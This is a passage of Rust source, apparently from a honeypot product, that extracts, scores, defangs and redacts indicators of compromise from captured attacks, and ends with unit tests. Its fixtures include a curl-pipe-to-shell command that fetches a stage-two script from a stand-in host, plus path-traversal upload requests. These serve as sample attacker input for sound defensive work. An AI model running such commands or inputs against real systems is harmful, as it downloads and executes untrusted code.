        value: format!("bf{FINGERPRINT_VERSION}:{}", hex::encode(&h[..16])),
        redacted: false,
        role: IocRole::Behaviour,
        field: "attempt:steps".into(),
        events,
        fingerprint: Some(FingerprintDetail {
            version: FINGERPRINT_VERSION,
            steps,
        }),
    })
}

// ---------------------------------------------------------------------------
// Extraction
// ---------------------------------------------------------------------------

struct Acc {
    ty: IocType,
    value: String,
    redacted: bool,
    roles: BTreeSet<IocRole>,
    first_seen: i64,
    last_seen: i64,
    first_attempt: String,
    events: BTreeSet<(i64, String)>,
    attempts: BTreeSet<String>,
    campaigns: BTreeSet<String>,
    decoys: BTreeSet<String>,
    catalogues: BTreeSet<String>,
    fields: BTreeSet<String>,
    fingerprint: Option<FingerprintDetail>,
    file_ioc_limited: bool,
}

impl Acc {
    fn new(c: &Candidate, a: &Attempt) -> Self {
        let ts = c.events.first().map_or(a.first_seen, |e| e.0);
        Acc {
            ty: c.ty,
            value: c.value.clone(),
            redacted: false,
            roles: BTreeSet::new(),
            first_seen: ts,
            last_seen: ts,
            first_attempt: a.attempt_id.clone(),
            events: BTreeSet::new(),
            attempts: BTreeSet::new(),
            campaigns: BTreeSet::new(),
            decoys: BTreeSet::new(),
            catalogues: BTreeSet::new(),
            fields: BTreeSet::new(),
            fingerprint: None,
            file_ioc_limited: false,
        }
    }

    fn add(&mut self, c: Candidate, a: &Attempt) {
        self.redacted |= c.redacted;
        self.roles.insert(c.role);
        for (ts, id) in c.events {
            if ts < self.first_seen || (ts == self.first_seen && a.attempt_id < self.first_attempt)
            {
                self.first_attempt = a.attempt_id.clone();
            }
            self.first_seen = self.first_seen.min(ts);
            self.last_seen = self.last_seen.max(ts);
            self.events.insert((ts, id));
        }
        self.attempts.insert(a.attempt_id.clone());
        self.campaigns.extend(a.campaign_id.iter().cloned());
        self.decoys.insert(a.decoy_id.clone());
        self.catalogues.insert(a.catalogue_id.clone());
        self.fields.insert(c.field);
        if self.fingerprint.is_none() {
            self.fingerprint = c.fingerprint;
        }
    }
}

fn evidence(
    signal_id: String,
    source: EvidenceSource,
    weight: u8,
    summary: String,
    reference: Option<String>,
) -> Evidence {
    Evidence {
        signal_id,
        source,
        weight,
        summary,
        reference,
    }
}

/// Score the indicator with #27. Evidence: the decoys it was seen at (a
/// decoy has no legitimate users, so this is a catalogue-style prior that
/// never publishes alone), vulnerable-path hooks and signatures in the
/// attempts it was seen in, and the lowest noise score of those attempts.
fn confidence(
    cfg: &ConfidenceConfig,
    id: &str,
    acc: &Acc,
    attempts: &BTreeMap<&str, &Attempt>,
) -> IocConfidence {
    let mut ev = Vec::new();
    for d in acc.decoys.iter().take(MAX_CONFIDENCE_ITEMS) {
        ev.push(evidence(
            format!("decoy:{d}"),
            EvidenceSource::CataloguePrior,
            100,
            format!("seen at decoy {d}, which has no legitimate users"),
            None,
        ));
    }
    let mut noise: Option<u8> = None;
    for aid in acc.attempts.iter().take(MAX_CONFIDENCE_ITEMS) {
        let Some(a) = attempts.get(aid.as_str()) else {
            continue;
        };
        if let Some(h) = a.hook_hits.iter().find(|h| h.stage == HookStage::Trigger) {
            ev.push(evidence(
                format!("hook:{aid}:{}", h.hook_id),
                EvidenceSource::VulnPathHook,
                100,
                format!(
                    "seen in attempt {aid}, where vulnerable-path hook {} fired",
                    h.hook_id
                ),
                Some(h.event_id.clone()),
            ));
        }
        if a.state_history
            .iter()
            .any(|c| c.signal == StateSignal::Matcher)
        {
            ev.push(evidence(
                format!("signature:{aid}"),
                EvidenceSource::Rule,
                100,
                format!("seen in attempt {aid}, where a tier 1 signature matched"),
                None,
            ));
        }
        if let Some(n) = &a.noise {
            noise = Some(noise.map_or(n.score, |m| m.min(n.score)));
        }
    }
    if let Some(n) = noise {
        ev.push(evidence(
            format!("noise:{id}"),
            EvidenceSource::NoiseScore,
            n,
            format!("lowest source noise score across sightings is {n}"),
            None,
        ));
    }
    match score(cfg, LinkKind::AttemptIoc, &acc.first_attempt, id, ev, None) {
        Some(l) => IocConfidence {
            score: l.score,
            band: l.band,
            wording: l.wording,
            publishable: l.publishable,
            evidence: l.evidence,
            caps_applied: l.caps_applied,
        },
        None => IocConfidence {
            score: 0,
            band: Band::Low,
            wording: "we assess as".into(),
            publishable: false,
            evidence: vec![],
            caps_applied: vec![],
        },
    }
}

const MEMORY_ONLY_NOTE: &str = "Post-exploitation activity was seen but no file was captured, so the \
    implant may be memory-resident. File IOCs are limited and no file hash is reported; use the \
    command line, behaviour fingerprint and network callback indicators instead.";
const MEMORY_ONLY_REPORTED_NOTE: &str = "The capture reported a memory-only implant (data.memory_only), so file hashes may not \
     cover it even where a dropper was captured.";

/// Extract IOCs from attempts and the capture events they were built from.
/// `events` may hold other events; only the attempts' are read. The same
/// input always gives the same output.
pub fn extract(
    attempts: &[Attempt],
    events: &[CaptureEvent],
    cfg: &ConfidenceConfig,
    opts: ExtractOptions,
) -> Extraction {
    let by_id: BTreeMap<&str, &CaptureEvent> =
        events.iter().map(|e| (e.event_id.as_str(), e)).collect();
    let attempt_index: BTreeMap<&str, &Attempt> = attempts
        .iter()
        .map(|a| (a.attempt_id.as_str(), a))
        .collect();
    let mut accs: BTreeMap<String, Acc> = BTreeMap::new();
    let mut per_attempt = Vec::new();

    for a in attempts {
        let mut mine: Vec<&CaptureEvent> = a
            .event_ids
            .iter()
            .filter_map(|id| by_id.get(id.as_str()).copied())
            .collect();
        mine.sort_by(|x, y| (x.ts, &x.event_id).cmp(&(y.ts, &y.event_id)));
        mine.dedup_by(|x, y| x.event_id == y.event_id);

        let mut cands = Vec::new();
        for e in &mine {
            candidates(e, opts, &mut cands);
        }
        cands.extend(fingerprint(a, &mine));

        let mut refs: Vec<String> = Vec::new();
        let mut kept: BTreeSet<String> = BTreeSet::new();
        let mut dropped: BTreeSet<String> = BTreeSet::new();
        let mut has_file = false;
        for c in cands {
            let id = ioc_id(c.ty, &c.value);
            if !kept.contains(&id) {
                if refs.len() >= MAX_IOCS_PER_ATTEMPT {
                    dropped.insert(id);
                    continue;
                }
                kept.insert(id.clone());
                refs.push(id.clone());
            }
            has_file |= c.ty == IocType::FileSha256;
            accs.entry(id).or_insert_with(|| Acc::new(&c, a)).add(c, a);
        }

        let memory_only_reported = mine
            .iter()
            .any(|e| e.data.get("memory_only").and_then(Value::as_bool) == Some(true));
        let post = a.state == AttemptState::PostExploitation;
        let file_ioc_limited = memory_only_reported || (post && !has_file);
        let mut notes = Vec::new();
        if post && !has_file {
            notes.push(MEMORY_ONLY_NOTE.to_string());
        }
        if memory_only_reported {
            notes.push(MEMORY_ONLY_REPORTED_NOTE.to_string());
        }
        if !dropped.is_empty() {
            notes.push(format!(
                "{} more indicators were not kept: one attempt keeps at most {MAX_IOCS_PER_ATTEMPT}.",
                dropped.len()
            ));
        }
        if file_ioc_limited {
            for r in &refs {
                if let Some(acc) = accs.get_mut(r) {
                    acc.file_ioc_limited = true;
                }
            }
        }
        per_attempt.push(AttemptIocs {
            attempt_id: a.attempt_id.clone(),
            ioc_refs: refs,
            file_ioc_limited,
            notes,
        });
    }

    let mut iocs: Vec<Ioc> = accs
        .iter()
        .map(|(id, acc)| {
            let sightings = if acc.ty == IocType::BehaviourFingerprint {
                acc.attempts.len()
            } else {
                acc.events.len()
            };
            Ioc {
                ioc_id: id.clone(),
                ioc_type: acc.ty,
                value: acc.value.clone(),
                display: defang(acc.ty, &acc.value),
                roles: acc.roles.iter().copied().collect(),
                origin: IocOrigin::Observed,
                redacted: acc.redacted,
                file_ioc_limited: acc.file_ioc_limited,
                first_seen: acc.first_seen,
                last_seen: acc.last_seen,
                sightings: u32::try_from(sightings).unwrap_or(u32::MAX),
                attempt_ids: acc.attempts.iter().cloned().collect(),
                campaign_ids: acc.campaigns.iter().cloned().collect(),
                decoy_ids: acc.decoys.iter().cloned().collect(),
                catalogue_ids: acc.catalogues.iter().cloned().collect(),
                event_ids: acc
                    .events
                    .iter()
                    .take(MAX_EVENT_REFS)
                    .map(|(_, id)| id.clone())
                    .collect(),
                extracted_from: acc.fields.iter().cloned().collect(),
                enrichment: vec![],
                fingerprint: acc.fingerprint.clone(),
                confidence: confidence(cfg, id, acc, &attempt_index),
            }
        })
        .collect();
    iocs.sort_by(|a, b| {
        (a.first_seen, a.ioc_type, &a.value).cmp(&(b.first_seen, b.ioc_type, &b.value))
    });
    Extraction {
        iocs,
        attempts: per_attempt,
    }
}

/// Fill `ioc_refs` on each attempt from an extraction over the same
/// attempts.
pub fn attach_refs(attempts: &mut [Attempt], extraction: &Extraction) {
    for a in attempts {
        if let Some(x) = extraction.for_attempt(&a.attempt_id) {
            a.ioc_refs = x.ioc_refs.clone();
        }
    }
}

/// Addresses that need ASN context, for the caller to look up.
pub fn address_observables(iocs: &[Ioc]) -> Vec<Observable> {
    let mut out: Vec<Observable> = iocs
        .iter()
        .filter(|i| matches!(i.ioc_type, IocType::Ip | IocType::Ipv6))
        .filter_map(|i| Observable::ip(&i.value).ok())
        .collect();
    out.sort();
    out.dedup();
    out
}

/// Attach ASN and country context (#11) to address IOCs: the newest
/// `asn.*` and `geo.*` Fact per provider and key. Other Facts (reputation)
/// are triage context, not part of the indicator.
pub fn apply_enrichment(iocs: &mut [Ioc], facts: &BTreeMap<Observable, Vec<Fact>>) {
    for i in iocs
        .iter_mut()
        .filter(|i| matches!(i.ioc_type, IocType::Ip | IocType::Ipv6))
    {
        let Some(fs) = Observable::ip(&i.value).ok().and_then(|o| facts.get(&o)) else {
            continue;
        };
        let mut newest: BTreeMap<(String, String), &Fact> = BTreeMap::new();
        for f in fs
            .iter()
            .filter(|f| f.key.starts_with("asn.") || f.key.starts_with("geo."))
        {
            let k = (f.provider.clone(), f.key.clone());
            if newest
                .get(&k)
                .is_none_or(|g| f.observed_at >= g.observed_at)
            {
                newest.insert(k, f);
            }
        }
        i.enrichment = newest
            .into_values()
            .map(|f| EnrichmentRef {
                provider: f.provider.clone(),
                key: f.key.clone(),
                value: match &f.value {
                    Value::String(s) => Value::String(printable(s)),
                    v => v.clone(),
                },
                observed_at: f.observed_at,
                shareable: !is_never_redistribute(&f.provider),
            })
            .collect();
    }
}

/// IOCs as they may leave the operator's console (#13, #35, #37): enrichment
/// refs from never-redistribute providers are dropped. Everything else is
/// already observed by Foiled's own decoys.
pub fn redact_for_export(iocs: &[Ioc]) -> Vec<Ioc> {
    iocs.iter()
        .cloned()
        .map(|mut i| {
            i.enrichment
                .retain(|r| r.shareable && !is_never_redistribute(&r.provider));
            i
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::attempt::{DEFAULT_IDLE_GAP_MS, ExtraSignals, build};
    use serde_json::json;

    const T0: i64 = 1_792_285_323_000;

    fn ev(id: &str, ts: i64, channel: &str, src: &str, data: Value) -> Value {
        json!({
            "event_id": id, "ts": ts, "decoy_id": "d1", "catalogue_id": "foiled/demo-app/1.0.0",
            "decoy_kind": "sandbox", "channel": channel, "severity": "info", "tenant_id": "t1",
            "src": {"ip": src}, "data": data
        })
    }

    fn hook(id: &str, ts: i64, src: &str, stage: &str, extra: Value) -> Value {
        let mut v = ev(id, ts, "hook", src, json!({}));
        let mut h = json!({"hook_id": "demo-app.upload-path-traversal",
            "catalogue_id": "foiled/demo-app/1.0.0", "cve_id": "FOILED-DEMO-0001",
            "stage": stage, "sequence_no": 1, "t_offset_ms": 0});
        if let Value::Object(m) = extra {
            for (k, x) in m {
                h[k] = x;
            }
        }
        v["hook"] = h;
        v
    }

    fn parse(vs: Vec<Value>) -> Vec<CaptureEvent> {
        vs.into_iter()
            .map(|v| serde_json::from_value(v).unwrap())
            .collect()
    }

    fn run(events: &[CaptureEvent], opts: ExtractOptions) -> (Vec<Attempt>, Extraction) {
        let attempts = build(events, DEFAULT_IDLE_GAP_MS, &ExtraSignals::new());
        let x = extract(&attempts, events, &ConfidenceConfig::default(), opts);
        (attempts, x)
    }

    fn values(x: &Extraction, ty: IocType) -> Vec<&str> {
        x.iocs
            .iter()
            .filter(|i| i.ioc_type == ty)
            .map(|i| i.value.as_str())
            .collect()
    }

    #[test]
    fn redaction_removes_secrets_and_email_local_parts() {
        let cases = [
            (
                "/login?user=bob&password=hunter2&x=1",
                "/login?user=bob&password=REDACTED&x=1",
            ),
            ("/a?token=abc", "/a?token=REDACTED"),
            ("/a?mytoken=abc", "/a?mytoken=abc"),
            (
                "curl http://u:p@203.0.113.9/x",
                "curl http://REDACTED@203.0.113.9/x",
            ),
            (
                "mysql --password hunter2 -h db",
                "mysql --password REDACTED -h db",
            ),
            ("app --password=hunter2", "app --password=REDACTED"),
            (
                "Authorization: Bearer abc.def",
                "Authorization: Bearer REDACTED",
            ),
            (
                "mail admin@example.invalid now",
                "mail REDACTED@example.invalid now",
            ),
            ("ssh root@203.0.113.9", "ssh root@203.0.113.9"),
            ("/plain/path", "/plain/path"),
        ];
        for (raw, want) in cases {
            let (got, changed) = redact(raw);
            assert_eq!(got, want, "{raw}");
            assert_eq!(changed, raw != want, "{raw}");
        }
    }

    #[test]
    fn redaction_is_linear_on_hostile_input() {
        let s = "=".repeat(100_000) + &"@".repeat(100_000) + &"://".repeat(30_000);
        let (out, _) = redact(&s);
        assert_eq!(out.len(), s.len());
    }

    #[test]
    fn defang_and_refang() {
        assert_eq!(defang(IocType::Ip, "203.0.113.7"), "203[.]0[.]113[.]7");
        assert_eq!(defang(IocType::Ipv6, "2001:db8::1"), "2001[:]db8[:][:]1");
        assert_eq!(
            defang(IocType::Url, "http://stage2.example.invalid/x.sh"),
            "hxxp://stage2[.]example[.]invalid/x.sh"
        );
        assert_eq!(
            defang(IocType::Cmdline, "curl HTTPS://a.example.invalid/x\u{202E}"),
            "curl hxxps://a.example.invalid/x\\u{202e}"
        );
        assert_eq!(
            refang("hxxp://stage2[.]example[.]invalid/x.sh"),
            "http://stage2.example.invalid/x.sh"
        );
        assert_eq!(refang(" 203[.]0[.]113[.]7 "), "203.0.113.7");
    }

    #[test]
    fn network_values_are_normalised_and_private_addresses_skipped() {
        let mut egress = ev(
            "e2",
            T0 + 10,
            "egress",
            "10.85.1.2",
            json!({"verdict": "blocked",
            "host": "Stage2.Example.INVALID", "method": "GET", "path": "/x.sh"}),
        );
        egress["dst"] = json!({"ip": "192.0.2.80", "port": 80});
        let mut internal = ev(
            "e3",
            T0 + 20,
            "egress",
            "10.85.1.2",
            json!({"method": "POST"}),
        );
        internal["dst"] = json!({"ip": "10.0.0.5", "port": 80});
        let events = parse(vec![
            hook("e1", T0, "203.0.113.7", "trigger", json!({})),
            egress,
            internal,
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert_eq!(values(&x, IocType::Ip), vec!["203.0.113.7", "192.0.2.80"]);
        assert_eq!(values(&x, IocType::Domain), vec!["stage2.example.invalid"]);
        assert_eq!(
            values(&x, IocType::Url),
            vec!["http://stage2.example.invalid/x.sh"]
        );
        let url = x.iocs.iter().find(|i| i.ioc_type == IocType::Url).unwrap();
        assert_eq!(url.roles, vec![IocRole::Stage2]);
        assert_eq!(url.display, "hxxp://stage2[.]example[.]invalid/x.sh");
    }

    #[test]
    fn canary_values_never_become_iocs() {
        let beacon = ev(
            "e1",
            T0,
            "egress",
            "203.0.113.45",
            json!({"detector": "beacon",
            "canary_id": "cn_5b0e9d2a71c4f836", "method": "GET",
            "path": "/c/cn_5b0e9d2a71c4f836/v1/users", "user_agent": "python-requests/2.32.3"}),
        );
        let events = parse(vec![
            ev(
                "e0",
                T0 - 10,
                "application",
                "203.0.113.45",
                json!({"method": "GET",
                "path": "/admin?key=vt-canary-ak-0000"}),
            ),
            beacon,
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert!(
            x.iocs
                .iter()
                .all(|i| !i.value.contains("canary") && !i.value.contains("cn_"))
        );
        assert_eq!(values(&x, IocType::Ip), vec!["203.0.113.45"]);
        assert_eq!(values(&x, IocType::HttpUa), vec!["python-requests/2.32.3"]);
    }

    #[test]
    fn bodies_are_hash_only_unless_payloads_are_stored() {
        let events = parse(vec![ev(
            "e1",
            T0,
            "application",
            "203.0.113.7",
            json!({"method": "POST", "path": "/u",
                "body": "a=1", "body_sha256": "9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"}),
        )]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert!(values(&x, IocType::RequestSubstring).is_empty());
        assert_eq!(
            values(&x, IocType::PayloadSha256),
            vec!["9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"]
        );
        let (_, x) = run(
            &events,
            ExtractOptions {
                store_payloads: true,
            },
        );
        assert_eq!(values(&x, IocType::RequestSubstring), vec!["a=1"]);
    }

    #[test]
    fn memory_only_attempt_is_flagged_and_has_no_file_hash() {
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "203.0.113.7",
                json!({"method": "POST",
                "path": "/api/upload?path=../../tmp/x.sh", "user_agent": "demo-loader/0.1"}),
            ),
            hook("e2", T0 + 10, "203.0.113.7", "trigger", json!({})),
            hook(
                "e3",
                T0 + 20,
                "203.0.113.7",
                "post_exploit",
                json!({
                "cmd_lines": ["sh -c 'curl -s http://stage2.example.invalid/m | sh'"]}),
            ),
        ]);
        let (attempts, x) = run(&events, ExtractOptions::default());
        let a = x.for_attempt(&attempts[0].attempt_id).unwrap();
        assert!(a.file_ioc_limited);
        assert!(a.notes[0].contains("memory-resident"));
        assert!(values(&x, IocType::FileSha256).is_empty());
        assert!(x.iocs.iter().all(|i| i.file_ioc_limited));
        assert_eq!(values(&x, IocType::BehaviourFingerprint).len(), 1);
        assert_eq!(values(&x, IocType::Cmdline).len(), 1);
        assert_eq!(
            values(&x, IocType::Url),
            vec!["http://stage2.example.invalid/m"]
        );
    }

    #[test]
    fn implant_hash_lifts_the_file_limit() {
        let sha = "c1c5d1b2f75673adc7db8fbf8bf1ab10f405dac8e71ce3cb8d7d0fef7fdeb172";
        let events = parse(vec![
            hook("e1", T0, "203.0.113.7", "trigger", json!({})),
            hook(
                "e2",
                T0 + 10,
                "203.0.113.7",
                "post_exploit",
                json!({
                "implant_refs": [format!("r2://foiled-evidence/t1/d1/_/quarantine/{sha}")]}),
            ),
        ]);
        let (attempts, x) = run(&events, ExtractOptions::default());
        assert!(
            !x.for_attempt(&attempts[0].attempt_id)
                .unwrap()
                .file_ioc_limited
        );
        assert_eq!(values(&x, IocType::FileSha256), vec![sha]);
    }

    #[test]
    fn fingerprint_ignores_volatile_values_and_input_order() {
        let chain = |src: &str, host: &str, id: &str| {
            let mut egress = ev(
                &format!("{id}3"),
                T0 + 30,
                "egress",
                "10.85.1.2",
                json!({"host": host, "method": "GET", "path": "/s"}),
            );
            egress["dst"] = json!({"ip": "192.0.2.80", "port": 80});
            parse(vec![
                ev(
                    &format!("{id}1"),
                    T0,
                    "application",
                    src,
                    json!({"method": "POST",
                    "path": "/api/upload?path=../../tmp/12345.sh"}),
                ),
                hook(&format!("{id}2"), T0 + 10, src, "trigger", json!({})),
                egress,
            ])
        };
        let (_, a) = run(
            &chain("203.0.113.7", "a.example.invalid", "a"),
            ExtractOptions::default(),
        );
        let mut other = chain("198.51.100.9", "b.example.invalid", "b");
        other.reverse();
        let (_, b) = run(&other, ExtractOptions::default());
        let fa = values(&a, IocType::BehaviourFingerprint);
        assert_eq!(fa, values(&b, IocType::BehaviourFingerprint));
        assert!(fa[0].starts_with("bf1:") && fa[0].len() == 36);
        let detail = a.iocs.iter().find_map(|i| i.fingerprint.clone()).unwrap();
        assert_eq!(
            detail.steps,
            vec![
                "http POST /api/upload?path",
                "hook demo-app.upload-path-traversal trigger",
                "egress GET"
            ]
        );
    }

    #[test]
    fn probe_only_attempts_have_no_fingerprint_and_low_confidence() {
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "198.51.100.23",
                json!({"method": "GET", "path": "/"}),
            ),
            ev(
                "e2",
                T0 + 1,
                "application",
                "198.51.100.23",
                json!({"method": "GET", "path": "/admin"}),
            ),
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert!(values(&x, IocType::BehaviourFingerprint).is_empty());
        assert!(
            values(&x, IocType::HttpPath) == vec!["/admin"],
            "'/' is not an IOC"
        );
        let ip = &x.iocs[0];
        assert_eq!(ip.confidence.band, Band::Low);
        assert!(!ip.confidence.publishable);
        assert_eq!(ip.confidence.wording, "we assess as");
    }

    #[test]
    fn dedup_across_attempts_tracks_first_and_last_seen() {
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "203.0.113.7",
                json!({"method": "GET", "path": "/admin", "user_agent": "x/1"}),
            ),
            ev(
                "e2",
                T0 + DEFAULT_IDLE_GAP_MS + 5,
                "application",
                "203.0.113.7",
                json!({"method": "GET", "path": "/admin", "user_agent": "x/1"}),
            ),
        ]);
        let (attempts, x) = run(&events, ExtractOptions::default());
        assert_eq!(attempts.len(), 2);
        let ua = x
            .iocs
            .iter()
            .find(|i| i.ioc_type == IocType::HttpUa)
            .unwrap();
        assert_eq!(ua.attempt_ids.len(), 2);
        assert_eq!(ua.sightings, 2);
        assert_eq!(
            (ua.first_seen, ua.last_seen),
            (T0, T0 + DEFAULT_IDLE_GAP_MS + 5)
        );
        assert_eq!(ua.ioc_id, ioc_id(IocType::HttpUa, "x/1"));
        let mut attempts = attempts;
        attach_refs(&mut attempts, &x);
        assert!(attempts.iter().all(|a| a.ioc_refs.contains(&ua.ioc_id)));
    }

    #[test]
    fn hook_evidence_raises_confidence() {
        let events = parse(vec![hook("e1", T0, "203.0.113.7", "trigger", json!({}))]);
        let (_, x) = run(&events, ExtractOptions::default());
        let ip = &x.iocs[0];
        // Hook 60 plus decoy prior 10, less 2 for a noise score of 10.
        assert_eq!(ip.confidence.score, 68);
        assert!(ip.confidence.publishable);
    }

    #[test]
    fn protocol_credentials_are_redacted() {
        let events = parse(vec![ev(
            "e1",
            T0,
            "application",
            "203.0.113.7",
            json!({"command": "AUTH", "args": ["hunter2"]}),
        )]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert_eq!(values(&x, IocType::RequestSubstring), vec!["AUTH REDACTED"]);
        assert!(x.iocs.iter().any(|i| i.redacted));
    }

    #[test]
    fn enrichment_refs_are_marked_and_dropped_for_export() {
        let events = parse(vec![ev("e1", T0, "application", "203.0.113.7", json!({}))]);
        let (_, mut x) = run(&events, ExtractOptions::default());
        let o = Observable::ip("203.0.113.7").unwrap();
        let fact = |provider: &str, key: &str, v: Value, at: i64| Fact {
            provider: provider.into(),
            key: key.into(),
            value: v,
            confidence: 90,
            observed_at: at,
            ttl_secs: 60,
            raw_ref: None,
        };
        let facts = BTreeMap::from([(
            o,
            vec![
                fact("local_asn", "asn.number", json!(64498), 1),
                fact("local_asn", "asn.number", json!(64499), 2),
                fact("greynoise", "greynoise.noise", json!(true), 2),
                fact("team_asn", "asn.org", json!("Example\u{202E}Hosting"), 2),
            ],
        )]);
        assert_eq!(address_observables(&x.iocs).len(), 1);
        apply_enrichment(&mut x.iocs, &facts);
        let e = &x.iocs[0].enrichment;
        assert_eq!(e.len(), 2);
        assert_eq!(e[0].value, json!(64499), "newest fact wins");
        assert!(!e[0].shareable);
        assert_eq!(e[1].value, json!("Example\\u{202e}Hosting"));
        let out = redact_for_export(&x.iocs);
        assert_eq!(out[0].enrichment.len(), 1);
        assert_eq!(out[0].enrichment[0].provider, "team_asn");
    }

    #[test]
    fn types_round_trip() {
        for t in IocType::ALL {
            assert_eq!(IocType::parse(t.as_str()), Some(t));
            assert_eq!(serde_json::to_value(t).unwrap(), json!(t.as_str()));
        }
        assert_eq!(IocType::parse("md5"), None);
    }
}
